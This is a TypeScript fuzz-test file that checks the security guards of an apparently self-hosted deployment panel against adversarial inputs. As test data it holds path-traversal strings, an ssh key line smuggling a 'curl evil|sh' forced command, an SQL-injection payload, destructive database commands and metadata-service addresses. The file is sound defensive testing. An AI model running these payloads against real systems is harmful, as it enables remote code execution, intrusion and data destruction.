/**
 * Property-based fuzzing of the functions that are catastrophic if they are ever
 * wrong for even one input.
 *
 * These are all pure, fast, and sit on a security boundary: a path confiner, the
 * address blocklist, the permission oracle, the read-only guards, the ssh-key parser,
 * the bot token, the SQL literal encoder, the TOTP step, the proxy config. An
 * example-based test proves they handle the cases we thought of. `fast-check` throws
 * thousands of cases we did not, plus the adversarial corners it is told to aim at,
 * and shrinks any failure to the smallest input that still breaks. Each block below
 * states the invariant that must hold for *every* input, and that sentence is the
 * whole point: a fuzz test with no stated invariant is just noise generation.
 */
import { afterAll, beforeAll, describe, expect, test } from 'bun:test';
import { mkdtempSync } from 'node:fs';
import { rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import fc from 'fast-check';
import { safeJoin } from '../src/build/detect.ts';
import { validName as validSiteName } from '../src/build/source.ts';
import { isReadOnlyCommand } from '../src/catalog/browse.ts';
import { isReadOnlyMongo } from '../src/catalog/browse-mongo.ts';
import { isReadOnly } from '../src/catalog/browse-sql.ts';
import { hexLiteral } from '../src/catalog/dbclient.ts';
import { closeDb, initDb } from '../src/db/index.ts';
import { createProject } from '../src/db/repo/projects.ts';
import { createAppService } from '../src/db/repo/services.ts';
import { createVolume } from '../src/db/repo/volumes.ts';
import { mayCall } from '../src/http/permissions.ts';
import { verifyCodeStep } from '../src/http/totp.ts';
import { issueChallenge, verifyChallenge } from '../src/proxy/botguard.ts';
import { synthesizeCaddyConfig } from '../src/proxy/routes.ts';
import { resolveInsideStorage, validName as validStorageName } from '../src/runtime/files.ts';
import { parseKeyLine } from '../src/system/ssh.ts';
import { loadSecretKey } from '../src/util/crypto.ts';
import { isBlockedFetchAddress, isPrivateAddress } from '../src/util/net.ts';

const dir = mkdtempSync(join(tmpdir(), 'derailed-fuzz-'));
let serviceId = '';
const STORAGE = '/data';

beforeAll(() => {
  initDb(join(dir, 'test.db'));
  loadSecretKey(join(dir, 'secret.key'));
  const project = createProject('Fuzz');
  const service = createAppService({
    projectId: project.id,
    name: 'app',
    source: 'image',
    image: 'nginx:alpine',
    repoUrl: null,
    branch: null,
  });
  serviceId = service.id;
  createVolume(serviceId, STORAGE);
});

afterAll(async () => {
  closeDb();
  await rm(dir, { recursive: true, force: true });
});

// A generator that leans on the characters that break path and name checks: the
// separators, the climbers, NUL, and the unicode look-alikes.
const nastyPath = fc.string({
  unit: fc.constantFrom(
    ...'abcABC012/\\..%.~'.split(''),
    '\0',
    '⁄', // fraction slash, a slash look-alike
    '／', // fullwidth solidus
    '..',
    '../',
    '%2e%2e',
  ),
  maxLength: 40,
});

describe('safeJoin never escapes the repository root', () => {
  test('the result is the root or strictly beneath it, for any sub', () => {
    const base = resolve(dir, 'checkout');
    fc.assert(
      fc.property(nastyPath, (sub) => {
        let out: string;
        try {
          out = safeJoin(base, sub);
        } catch {
          // Refusing is always a correct answer; only a wrong *acceptance* is a bug.
          return true;
        }
        return out === base || out.startsWith(`${base}/`);
      }),
      { numRuns: 5000 },
    );
  });

  test('an empty sub is the base, and a rooted sub is pulled back under it', () => {
    const base = resolve(dir, 'checkout');
    expect(safeJoin(base, null)).toBe(base);
    expect(safeJoin(base, '/etc/passwd')).toBe(`${base}/etc/passwd`);
    expect(() => safeJoin(base, '../../../etc/passwd')).toThrow();
  });
});

describe('a validated name is always a single harmless segment', () => {
  test('storage names never carry a separator, a dot-name, or NUL', () => {
    fc.assert(
      fc.property(nastyPath, (name) => {
        const out = validStorageName(name);
        if (out === null) return true;
        return (
          !out.includes('/') &&
          !out.includes('\0') &&
          out !== '.' &&
          out !== '..' &&
          new TextEncoder().encode(out).length <= 100
        );
      }),
      { numRuns: 5000 },
    );
  });

  test('site names also refuse the backslash, which is a separator on the other OS', () => {
    fc.assert(
      fc.property(nastyPath, (name) => {
        const out = validSiteName(name);
        if (out === null) return true;
        return !out.includes('/') && !out.includes('\\') && !out.includes('\0');
      }),
      { numRuns: 5000 },
    );
  });
});

describe('resolveInsideStorage never returns a path outside a storage root', () => {
  test('any accepted path sits under /data; anything with .. or NUL is refused', () => {
    fc.assert(
      fc.property(nastyPath, (tail) => {
        for (const candidate of [tail, `/data/${tail}`, `${tail}`, `/data/${tail}/x`]) {
          const out = resolveInsideStorage(serviceId, candidate);
          if (out === null) continue;
          if (out !== STORAGE && !out.startsWith(`${STORAGE}/`)) return false;
          if (out.includes('\0')) return false;
          if (out.split('/').includes('..')) return false;
        }
        return true;
      }),
      { numRuns: 5000 },
    );
  });
});

describe('the address blocklist never calls a private or reserved address public', () => {
  // Every one of these is a way to name loopback, the private ranges, CGNAT, or the
  // cloud metadata service. Not one may be classified as fetchable.
  const alwaysBlockedQuads = [
    '127.0.0.1',
    '127.255.255.254',
    '10.0.0.1',
    '10.255.255.255',
    '172.16.0.1',
    '172.31.255.255',
    '192.168.0.1',
    '169.254.169.254', // the metadata address, the whole reason this exists
    '0.0.0.0',
    '100.64.0.1', // CGNAT
    '100.127.255.255',
    '192.0.0.1',
    '198.18.0.1',
    '198.19.255.255',
    '224.0.0.1',
    '255.255.255.255',
  ];

  test('the canonical private and reserved quads are all blocked', () => {
    for (const address of alwaysBlockedQuads) {
      expect(isBlockedFetchAddress(address), address).toBe(true);
    }
  });

  test('bracketed, mapped, and mixed-case loopback stays blocked', () => {
    for (const address of ['[::1]', '::ffff:127.0.0.1', '::FFFF:127.0.0.1', '::', '[::]']) {
      expect(isBlockedFetchAddress(address), address).toBe(true);
    }
  });

  test('fuzzing the private ranges: a random address inside one is never public', () => {
    fc.assert(
      fc.property(fc.integer({ min: 0, max: 255 }), fc.integer({ min: 0, max: 255 }), (c, d) => {
        // 10.x, 192.168.x, 127.x, 169.254.x are private/loopback/link-local by
        // definition, whatever the low octets are.
        return (
          isPrivateAddress(`10.${c}.${d}.1`) &&
          isPrivateAddress(`192.168.${c}.${d}`) &&
          isPrivateAddress(`127.${c}.${d}.1`) &&
          isPrivateAddress(`169.254.${c}.${d}`) &&
          isBlockedFetchAddress(`10.${c}.${d}.1`)
        );
      }),
      { numRuns: 3000 },
    );
  });

  test('fuzzing 172.16.0.0/12: inside is private, the neighbours 172.15 and 172.32 are not', () => {
    fc.assert(
      fc.property(fc.integer({ min: 16, max: 31 }), fc.integer({ min: 0, max: 255 }), (b, d) => {
        return isPrivateAddress(`172.${b}.${d}.1`);
      }),
      { numRuns: 2000 },
    );
    expect(isPrivateAddress('172.15.0.1')).toBe(false);
    expect(isPrivateAddress('172.32.0.1')).toBe(false);
  });
});

describe('the permission oracle keeps its two hard promises', () => {
  const methods = fc.constantFrom('GET', 'HEAD', 'OPTIONS', 'POST', 'PUT', 'PATCH', 'DELETE');
  // Paths shaped like the real router, so the rules actually get exercised rather than
  // every random string falling through to the default.
  const pathish = fc.constantFrom(
    '/api/services/abc/env',
    '/api/services/abc/expose',
    '/api/services/abc/files',
    '/api/projects/abc/env',
    '/api/people',
    '/api/tokens',
    '/api/system/ssh/keys',
    '/api/backups/abc/download',
    '/api/backups/abc/restore',
    '/api/volumes/abc',
    '/api/webhooks',
    '/api/trash/db/abc',
    '/api/deployments/abc/logs',
    '/api/services/abc/deployments',
    '/api/uptime/abc/status-page',
    '/api/anything/made/up',
  );

  test('an owner is allowed everything, always', () => {
    fc.assert(
      fc.property(methods, pathish, (method, path) => mayCall('owner', method, path).ok),
      { numRuns: 5000 },
    );
  });

  test('a viewer is never granted a write', () => {
    fc.assert(
      fc.property(methods, pathish, (method, path) => {
        const isWrite = !['GET', 'HEAD', 'OPTIONS'].includes(method);
        if (!isWrite) return true;
        return mayCall('viewer', method, path).ok === false;
      }),
      { numRuns: 5000 },
    );
  });

  test('a member is never granted an owner-only route', () => {
    // The routes the table reserves for an owner, across every method: a member must
    // be refused on all of them.
    const ownerOnly = [
      ['DELETE', '/api/services/abc'],
      ['DELETE', '/api/projects/abc'],
      ['DELETE', '/api/volumes/abc'],
      ['POST', '/api/services/abc/expose'],
      ['GET', '/api/backups/abc/download'],
      ['POST', '/api/backups/abc/restore'],
      ['GET', '/api/people'],
      ['POST', '/api/people'],
      ['GET', '/api/tokens'],
      ['POST', '/api/system/ssh/keys'],
      ['POST', '/api/webhooks'],
      ['DELETE', '/api/trash/db/abc'],
    ] as const;
    for (const [method, path] of ownerOnly) {
      expect(mayCall('member', method, path).ok, `${method} ${path}`).toBe(false);
    }
  });
});

describe('the SQL read-only guard never blesses a write', () => {
  // A corpus of statements that plainly change data, then mutated the ways a guard
  // gets fooled: casing, whitespace, comments, a wrapping CTE, a leading paren.
  const writes = [
    'DELETE FROM users',
    'UPDATE users SET x = 1',
    'INSERT INTO users VALUES (1)',
    'DROP TABLE users',
    'TRUNCATE users',
    'ALTER TABLE users ADD c int',
    'CREATE TABLE t (a int)',
    'GRANT ALL ON users TO bob',
    'WITH gone AS (DELETE FROM t RETURNING *) SELECT * FROM gone',
    'SELECT * INTO OUTFILE "/tmp/x" FROM users',
    'EXPLAIN ANALYZE DELETE FROM users',
  ];

  const mutate = fc.tuple(
    fc.constantFrom(...writes),
    fc.constantFrom(
      (s: string) => s,
      (s: string) => s.toLowerCase(),
      (s: string) => s.toUpperCase(),
      (s: string) => `  ${s}  `,
      (s: string) => s.replace(/ /g, '\t'),
      (s: string) => s.replace(/ /g, '\n'),
      (s: string) => `/* comment */ ${s}`,
      (s: string) => `(${s})`,
      (s: string) => `${s};`,
    ),
  );

  test('every mutation of a known write is refused', () => {
    fc.assert(
      fc.property(mutate, ([sql, mutator]) => isReadOnly(mutator(sql)) === false),
      { numRuns: 3000 },
    );
  });

  test('a plain SELECT is allowed, so the guard is not just always-false', () => {
    expect(isReadOnly('SELECT 1')).toBe(true);
    expect(isReadOnly('select * from users where id = 1')).toBe(true);
  });

  test('a stacked statement smuggled after a SELECT is refused', () => {
    fc.assert(
      fc.property(fc.constantFrom(...writes), (write) => {
        return isReadOnly(`SELECT 1; ${write}`) === false;
      }),
      { numRuns: 2000 },
    );
  });
});

describe('the Mongo read-only guard never blesses a write', () => {
  const writes = [
    'db.users.drop()',
    'db.users.deleteOne({})',
    'db.users.remove({})',
    'db.users.insertOne({})',
    'db.users.updateMany({}, {})',
    'db.users.aggregate([{$out: "stolen"}])',
    'db.users.aggregate([{$merge: "stolen"}])',
    'db.users.mapReduce(m, r, {out: "stolen"})',
    'db.users.find({$where: "sleep(1000)"})',
    'db.users["drop"]()',
    "db.users['remove']({})",
    'db.getCollection("users").drop()',
  ];

  test('every write form, and its bracket/case variants, is refused', () => {
    const mutate = fc.tuple(
      fc.constantFrom(...writes),
      fc.constantFrom(
        (s: string) => s,
        (s: string) => `  ${s} `,
        (s: string) => `${s};`,
        (s: string) => s.replace(/db\./, 'db  .'),
      ),
    );
    fc.assert(
      fc.property(mutate, ([expr, mutator]) => isReadOnlyMongo(mutator(expr)) === false),
      { numRuns: 3000 },
    );
  });

  test('an honest find is allowed', () => {
    expect(isReadOnlyMongo('db.users.find({ active: true })')).toBe(true);
    expect(isReadOnlyMongo('db.users.countDocuments({})')).toBe(true);
  });
});

describe('the Redis read-only guard never blesses a write', () => {
  const writes = ['SET k v', 'DEL k', 'FLUSHALL', 'HSET h f v', 'EXPIRE k 1', 'RENAME a b'];
  test('a writing command is refused whatever its casing or leading space', () => {
    fc.assert(
      fc.property(
        fc.constantFrom(...writes),
        fc.constantFrom(
          (s: string) => s,
          (s: string) => s.toLowerCase(),
          (s: string) => `  ${s}`,
        ),
        (cmd, mut) => isReadOnlyCommand(mut(cmd)) === false,
      ),
      { numRuns: 2000 },
    );
  });
  test('GET and friends are allowed', () => {
    expect(isReadOnlyCommand('GET k')).toBe(true);
    expect(isReadOnlyCommand('hgetall h')).toBe(true);
  });
});

describe('the ssh key parser never yields a multi-line key', () => {
  const VALID_ED25519 =
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL0T2Qm9k1u2Jv5nUqg8b9jY0mVn7wXKQe0d9bYQf3xZ derailed@test';

  test('a returned key never has a carriage return or newline in its line', () => {
    fc.assert(
      fc.property(
        fc.constantFrom('\n', '\r', '\r\n', ' \n ', ''),
        fc.string({ maxLength: 20 }),
        (sep, trailer) => {
          const parsed = parseKeyLine(`${VALID_ED25519}${sep}${trailer}`);
          if (parsed === null) return true;
          return !parsed.line.includes('\n') && !parsed.line.includes('\r');
        },
      ),
      { numRuns: 3000 },
    );
  });

  test('a valid single-line key round-trips; a two-line paste is refused whole', () => {
    const single = parseKeyLine(VALID_ED25519);
    expect(single).not.toBeNull();
    expect(single?.type).toBe('ssh-ed25519');
    // A second authorized_keys line, with its own forced command, must not ride in.
    const smuggled = `${VALID_ED25519}\nfrom="1.2.3.4",command="curl evil|sh" ${VALID_ED25519}`;
    expect(parseKeyLine(smuggled)).toBeNull();
  });

  test('a truncated blob is rejected rather than accepted as a short key', () => {
    fc.assert(
      fc.property(fc.integer({ min: 1, max: 40 }), (cut) => {
        const base64 = VALID_ED25519.split(' ')[1]!;
        const chopped = base64.slice(0, Math.max(0, base64.length - cut));
        const parsed = parseKeyLine(`ssh-ed25519 ${chopped} test`);
        // It may parse (if the chop still lands on a valid field boundary) but must
        // never claim a fingerprint for a blob that does not structurally validate;
        // the parser returns null on any structural mismatch, which is the guarantee.
        return parsed === null || parsed.type === 'ssh-ed25519';
      }),
      { numRuns: 2000 },
    );
  });
});

describe('the bot challenge token round-trips and refuses smuggling', () => {
  test('a token issued for a service and IP verifies only for that pair', () => {
    fc.assert(
      fc.property(
        fc.string({ minLength: 1, maxLength: 20 }),
        fc.string({ minLength: 1, maxLength: 20 }),
        (serviceId, ip) => {
          const now = 1_000_000;
          const token = issueChallenge(serviceId, ip, now);
          // The right pair, with a solved-enough nonce check aside, at least passes the
          // signature+identity gate: verifying for a *different* service or ip must fail.
          const wrongService = verifyChallenge(token, '0', `${serviceId}x`, ip, now + 1);
          const wrongIp = verifyChallenge(token, '0', serviceId, `${ip}x`, now + 1);
          return wrongService === false && wrongIp === false;
        },
      ),
      { numRuns: 2000 },
    );
  });

  test('a separator in a field cannot rewrite the expiry', () => {
    // The historical bug: joining fields with a raw delimiter let an IP of
    // `1.1.1.1|99999` inject a later expiry. Fields are base64url-encoded now, so an
    // IP containing the separator still verifies as itself and nothing else.
    const now = 1_000_000;
    const ip = '1.1.1.1|99999999999';
    const token = issueChallenge('svc', ip, now);
    // Verifying with the honest ip string is fine at the identity gate; verifying with
    // a *split* interpretation must not, i.e. the raw pieces are not separate fields.
    expect(verifyChallenge(token, '0', 'svc', '1.1.1.1', now + 1)).toBe(false);
  });

  test('a tampered signature is refused', () => {
    fc.assert(
      fc.property(fc.string({ minLength: 1, maxLength: 8 }), (junk) => {
        const token = issueChallenge('svc', '2.2.2.2', 1000);
        const tampered = `${token.slice(0, token.lastIndexOf('.'))}.${junk}`;
        return verifyChallenge(tampered, '0', 'svc', '2.2.2.2', 2000) === false;
      }),
      { numRuns: 2000 },
    );
  });
});

describe('hexLiteral cannot break out of the literal it is placed in', () => {
  // The only place the caller's value lands is the hex string inside the fixed
  // template. Pull that portion out and prove it is pure hex, whatever the input: a
  // value made entirely of hex digits cannot carry a quote, a paren, or a semicolon,
  // so it cannot close the literal and start SQL of its own.
  function injectedHex(engine: 'postgres' | 'mysql', out: string): string | null {
    const m =
      engine === 'postgres'
        ? out.match(/^convert_from\(decode\('([^']*)','hex'\),'UTF8'\)$/)
        : out.match(/^CAST\(X'([^']*)' AS CHAR\)$/);
    return m ? (m[1] ?? '') : null;
  }

  test('whatever the value, the injected portion is pure hex and nothing else', () => {
    fc.assert(
      fc.property(
        fc.string({ maxLength: 60 }),
        fc.constantFrom('postgres', 'mysql'),
        (value, engine) => {
          const eng = engine as 'postgres' | 'mysql';
          const hex = injectedHex(eng, hexLiteral(eng, value));
          // The template must match (nothing broke its shape) and the slot must be hex.
          return hex !== null && /^[0-9a-f]*$/.test(hex);
        },
      ),
      { numRuns: 4000 },
    );
  });

  test('the SQL-injection classic becomes inert hex digits, no live quote of its own', () => {
    const payload = "'); DROP TABLE users; --";
    const out = hexLiteral('postgres', payload);
    // The only quotes left are hexLiteral's own structural ones; the payload's are gone.
    expect(injectedHex('postgres', out)).toBe(Buffer.from(payload, 'utf8').toString('hex'));
    expect(out).not.toContain('DROP');
  });
});

describe('the TOTP step is single-use by construction', () => {
  test('the step a code verifies for is stable, so a caller can refuse anything <= it', () => {
    // The replay defence is: remember the last step used, refuse anything at or before
    // it. That only works if a given (secret, code, time) maps to one definite step.
    // Prove the mapping is a function: same inputs, same step, every time.
    fc.assert(
      fc.property(fc.integer({ min: 0, max: 2 ** 31 }), (at) => {
        const secret = 'JBSWY3DPEHPK3PXP';
        const code = '000000';
        const first = verifyCodeStep(secret, code, at * 1000);
        const second = verifyCodeStep(secret, code, at * 1000);
        return first === second;
      }),
      { numRuns: 2000 },
    );
  });

  test('a non-six-digit code is never accepted', () => {
    fc.assert(
      fc.property(fc.string({ maxLength: 8 }), (code) => {
        if (/^\d{6}$/.test(code.replace(/\s/g, ''))) return true; // that shape is the valid one
        return verifyCodeStep('JBSWY3DPEHPK3PXP', code, 1_000_000) === null;
      }),
      { numRuns: 3000 },
    );
  });
});

describe('the synthesised Caddy config strips inbound trust headers from every app route', () => {
  // Walk the whole config and collect every reverse_proxy that dials an app upstream,
  // asserting each deletes the X-Derailed-* headers a visitor could forge.
  function appProxiesStrip(config: unknown): { proxies: number; allStrip: boolean } {
    let proxies = 0;
    let allStrip = true;
    const trust = ['X-Derailed-Proxy', 'X-Derailed-Service', 'X-Derailed-User'];
    const walk = (node: unknown): void => {
      if (Array.isArray(node)) {
        for (const child of node) walk(child);
        return;
      }
      if (node && typeof node === 'object') {
        const obj = node as Record<string, unknown>;
        if (obj.handler === 'reverse_proxy') {
          const dial = String((obj.upstreams as { dial?: string }[] | undefined)?.[0]?.dial ?? '');
          // App upstreams dial the app container (route.upstream), not the panel.
          if (dial && !dial.includes('panel')) {
            proxies++;
            const del =
              (obj.headers as { request?: { delete?: string[] } } | undefined)?.request?.delete ??
              [];
            if (!trust.every((h) => del.includes(h))) allStrip = false;
          }
        }
        for (const value of Object.values(obj)) walk(value);
      }
    };
    walk(config);
    return { proxies, allStrip };
  }

  const hostname = fc.string({
    unit: fc.constantFrom(...'abcdefg0123.-'.split('')),
    minLength: 1,
    maxLength: 20,
  });

  test('for any set of app routes, every app proxy deletes the trust headers', () => {
    fc.assert(
      fc.property(fc.array(hostname, { minLength: 1, maxLength: 6 }), (hosts) => {
        const routes = hosts.map((h, i) => ({
          hostname: `${h}.example.com`,
          upstream: `d_app_${i}`,
          port: 80,
          https: true,
        }));
        const config = synthesizeCaddyConfig(routes as never, {
          httpPort: 80,
          httpsPort: 443,
        });
        const { proxies, allStrip } = appProxiesStrip(config);
        return proxies >= 1 && allStrip;
      }),
      { numRuns: 1000 },
    );
  });
});
